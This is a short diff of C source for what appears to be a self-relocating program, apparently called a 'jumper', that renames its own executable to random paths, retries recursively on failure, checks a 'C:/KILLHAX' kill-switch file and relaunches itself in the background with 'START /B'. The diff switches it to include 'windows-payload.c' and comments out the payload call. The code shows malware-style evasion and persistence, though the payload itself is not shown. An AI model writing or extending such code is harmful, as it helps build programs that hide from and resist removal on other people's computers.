@@ -6,11 +6,11 @@
 #include <sys/time.h>
 #include <time.h>
 #include <string.h>
-#include "payload.c"
+#include "windows-payload.c"
 
 #define FALSE 0
 #define TRUE 1
-#define ERROR -1
+#define ERR -1
 #define STOP "C:/KILLHAX"
 
 int isKill(){
@@ -37,13 +37,12 @@ void rand_str(char *dest, size_t length) {
 }
 
 int go(int argc, char *argv[]){
-    //chown(argv[0], 0, 0);
-    payload();
+    //payload();
     struct timeval te;
     gettimeofday(&te, NULL);
     srand((unsigned int)te.tv_usec);
     struct timespec ts;
-    ts.tv_sec = 1;
+    ts.tv_sec = 0;
     ts.tv_nsec = (rand()%100+50) * 1000000;
     nanosleep(&ts, &ts);
     //sleep(SLEEP);
@@ -69,8 +68,6 @@ int go(int argc, char *argv[]){
     printf("Jumper is now at %s\n", path);
     rename(argv[0], path);
     if( access( path, F_OK ) != 0 ) {
-        printf("ERR");
-        return 0;
         return go(argc, argv);
     }
     char cmd[50] = "START /B ";
